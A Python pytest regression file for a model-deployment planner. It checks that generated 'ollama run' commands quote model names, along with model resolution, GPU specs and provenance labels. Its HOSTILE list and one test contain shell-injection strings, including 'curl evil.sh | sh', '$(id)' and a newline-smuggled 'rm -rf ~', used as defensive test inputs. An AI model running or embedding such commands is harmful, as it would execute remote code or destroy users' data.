"""Regressions for defects an independent blind review found after 0.30.9.

Four of the five were incompletenesses in earlier fixes of mine, which is the
useful pattern here: each earlier fix was real, and each stopped one step short
of the case that mattered.

- The launch-command quoting fix reached three of four backends, and the test
  that was meant to prove it parametrized exactly those three -- omitting ollama,
  which wins the default plan for most registry queries.
- The resolver fix refused a MISMATCHED size (`llama3.1:405b`) but still guessed
  when no size could be parsed at all, so `phi-4` returned phi-2's facts.
- That guess was then stamped `vram: measured`.
- The reference-GPU correction updated bandwidth and TDP but left `fp16_tflops`
  holding the desktop RTX 4070 Ti's figure, and left four roofline fallbacks
  hardcoded to the superseded bandwidth.
"""

from __future__ import annotations

import pathlib

import pytest

from chimeraforge.planner.constants import MBU_DEFAULT, REFERENCE_BANDWIDTH_GBPS
from chimeraforge.planner.engine import Candidate
from chimeraforge.planner.hardware import REFERENCE_GPU, get_gpu
from chimeraforge.planner.identity import resolve_model
from chimeraforge.planner.launch import build_launch_command
from chimeraforge.planner.models import ThroughputModel
from chimeraforge.planner.resolver import ModelSpec

FIXTURES = pathlib.Path(__file__).parent / "fixtures"

HOSTILE = [
    "llama3.2:3b; curl evil.sh | sh",
    "llama3.2:3b$(id)",
    "llama3.2:3b`id`",
    "llama3.2:3b && whoami",
    "llama3.2:3b | tee /tmp/x",
]


def _cand(backend: str, model: str) -> Candidate:
    return Candidate(
        model=model,
        quant="Q4_K_M" if backend == "ollama" else "FP16",
        backend=backend,
        n_agents=1,
        vram_gb=9.0,
        quality=0.8,
        quality_tier="negligible",
        throughput_tps=100.0,
        total_throughput_tps=100.0,
        eta=1.0,
        p95_latency_ms=500.0,
        utilisation=0.5,
        monthly_cost=25.0,
        cost_per_1m_tok=0.1,
        safety_refusal=None,
        rtsi_risk="UNKNOWN",
        warnings=[],
    )


def _ollama_spec(name: str) -> ModelSpec:
    return ModelSpec(
        name=name,
        params_b=3.2,
        n_layers=28,
        n_kv_heads=8,
        d_head=128,
        hidden_size=3072,
        source="ollama",
    )


class TestOllamaLaunchIsQuoted:
    """The backend the previous quoting fix missed, and the one it emits most."""

    @pytest.mark.parametrize("hostile", HOSTILE)
    def test_metacharacters_cannot_escape_the_argument(self, hostile):
        cmd = build_launch_command(
            _cand("ollama", hostile), _ollama_spec(hostile), context_length=2048
        ).command
        arg = cmd.split("ollama run", 1)[1].strip()
        assert arg.startswith("'") and arg.endswith("'"), f"unquoted: {cmd!r}"

    def test_a_newline_cannot_append_a_second_command(self):
        """The variant that survives a careful 'copy the whole block'."""
        hostile = "llama3.2:3b\nrm -rf ~"
        cmd = build_launch_command(
            _cand("ollama", hostile), _ollama_spec(hostile), context_length=2048
        ).command
        after = cmd.split("ollama run", 1)[1]
        assert "\nrm -rf" not in after or after.strip().startswith("'")

    def test_an_ordinary_tag_is_not_uglified(self):
        cmd = build_launch_command(
            _cand("ollama", "llama3.2:3b"), _ollama_spec("llama3.2:3b"), context_length=2048
        ).command
        assert "ollama run llama3.2:3b" in cmd


class TestGenerationIsNotCrossed:
    """`phi-4` carries no `Nb` token and the `phi` family has one member, so the
    single-candidate shortcut returned phi-2 -- 2.78B standing in for 14.66B."""

    @pytest.mark.parametrize(
        "identifier", ["phi-4", "phi4:latest", "phi3.5", "microsoft/phi-4", "phi-3"]
    )
    def test_a_different_generation_is_refused(self, identifier):
        assert resolve_model(identifier) is None

    @pytest.mark.parametrize("identifier", ["phi", "phi:latest", "phi-2", "phi2"])
    def test_an_absent_or_matching_generation_still_resolves(self, identifier):
        """Refusing these too would be over-correction: they name no generation,
        so the single candidate is the defensible guess it always was."""
        assert resolve_model(identifier) == "phi-2"

    def test_sized_identifiers_are_unaffected(self):
        assert resolve_model("llama3.2:3b") == "llama3.2-3b"
        assert resolve_model("llama3.1:405b") is None


class TestApproximationIsNeverMeasured:
    def test_vram_is_estimated_for_an_approximated_alias(self):
        """VRAM is exact arithmetic, but over the ALIAS's architecture. Exact
        arithmetic on the wrong shape is not a measurement."""
        import json

        from typer.testing import CliRunner

        from chimeraforge.cli import app

        r = CliRunner().invoke(
            app,
            [
                "plan",
                "--model",
                "llama3.2:3b",
                "--no-network",
                "--hardware",
                "RTX 4080 12GB",
                "--json",
                "--budget",
                "1e9",
                "--quality-target",
                "0",
            ],
        )
        assert r.exit_code == 0, r.output
        row = json.loads(r.output[r.output.index("[") : r.output.rindex("]") + 1])[0]
        assert row["model_source"] == "registry-approx"
        assert row["provenance"]["vram"] == "estimated"
        assert row["provenance"]["safety"] == "unknown"


class TestReferenceGpuMatchesThePublishedPart:
    """Every prediction on every other GPU is scaled against this row, so a wrong
    figure here propagates to the whole database."""

    def test_specs_match_the_rtx_4080_laptop(self):
        gpu = get_gpu(REFERENCE_GPU)
        assert gpu is not None
        # NVIDIA RTX 4080 Laptop: 12 GB GDDR6, 192-bit, 432 GB/s, 150 W TGP.
        assert gpu.vram_gb == 12.0
        assert gpu.bandwidth_gbps == pytest.approx(432.0)
        assert gpu.tdp_watts == pytest.approx(150.0)

    def test_fp16_tflops_is_the_laptop_part_not_the_desktop_4070_ti(self):
        """80.2 is 2 x 40.09, the desktop RTX 4070 Ti's FP32 -- the identical
        value sat 15 lines above in GPU_DB. The laptop part is 7424 cores at
        2.28 GHz: 33.85 FP32, and this file's rule is dense FP16 = 2x FP32."""
        gpu = get_gpu(REFERENCE_GPU)
        expected = 7424 * 2 * 2.28e9 / 1e12 * 2
        assert gpu.fp16_tflops == pytest.approx(expected, abs=0.2)
        assert gpu.fp16_tflops != pytest.approx(80.2), "that is the RTX 4070 Ti's figure"

    def test_the_roofline_fallback_agrees_with_the_reference_card(self):
        """Four fallbacks stayed at a superseded 556.0 after the card was
        corrected to 432, which combined with MBU_DEFAULT to imply 467 GB/s from
        a 432 GB/s card."""
        assert REFERENCE_BANDWIDTH_GBPS == pytest.approx(get_gpu(REFERENCE_GPU).bandwidth_gbps)
        t = ThroughputModel({}, {}, (72.11, 0.0888))
        no_hw = t.roofline_tps(1.24, "FP16", hardware=None)
        explicit = t.roofline_tps(1.24, "FP16", hardware=REFERENCE_GPU)
        assert no_hw == pytest.approx(explicit)

    def test_the_calibration_reproduces_its_measured_anchor(self):
        """MBU_DEFAULT is back-solved from llama3.2-1b ollama FP16 = 146.33 tok/s.

        Pinned because the previous pair (0.65 x 556) was described as cancelling
        exactly against this one and does not: it gives 145.73, 0.41% low.
        """
        implied = MBU_DEFAULT * REFERENCE_BANDWIDTH_GBPS / (2 * 1.24)
        assert implied == pytest.approx(146.33, abs=0.1)


class TestBlankHardwareMatchesNothing:
    """`--hardware "$GPU"` with GPU unset returned the first row in GPU_DB."""

    @pytest.mark.parametrize("blank", ["", " ", "   ", "\t"])
    def test_blank_resolves_to_nothing(self, blank):
        assert get_gpu(blank) is None

    def test_real_lookups_still_work(self):
        assert get_gpu("RTX 4080 12GB").name == "RTX 4080 12GB"
        assert get_gpu("4080").name == "RTX 4080 12GB"
        assert get_gpu("h100") is not None

    def test_the_cli_refuses_rather_than_planning_a_different_card(self):
        from typer.testing import CliRunner

        from chimeraforge.cli import app

        r = CliRunner().invoke(app, ["plan", "--model-size", "3b", "--hardware", ""])
        assert r.exit_code == 1
        assert "hardware DB" in r.output


class TestWorkloadCv2IsNotBothMeasuredAndAbsent:
    """The absent-check ran above the derivation, so a log with enough rows to
    measure a CV^2 reported it `measured` and listed it under `absent` at once --
    and `plan` then said it was using the value while also saying the profile had
    not measured it."""

    def test_a_measured_value_is_not_listed_absent(self):
        from chimeraforge.workload import from_log

        p = from_log(FIXTURES / "requests_sample.jsonl")
        assert p.workload_cv2 is not None
        assert p.workload_cv2.provenance == "measured"
        assert "workload_cv2" not in p.absent

    def test_an_unmeasurable_value_is_still_listed_absent(self, tmp_path):
        """Too few rows to derive a CV^2: it must appear in `absent`, since that
        is what tells `plan` to fall back to the flag or the default."""
        import json

        from chimeraforge.workload import from_log

        rows = [
            {"timestamp": 1_700_000_000 + i, "prompt_tokens": 100, "completion_tokens": 50}
            for i in range(4)
        ]
        p = tmp_path / "short.jsonl"
        p.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
        got = from_log(p)
        assert got.workload_cv2 is None
        assert "workload_cv2" in got.absent
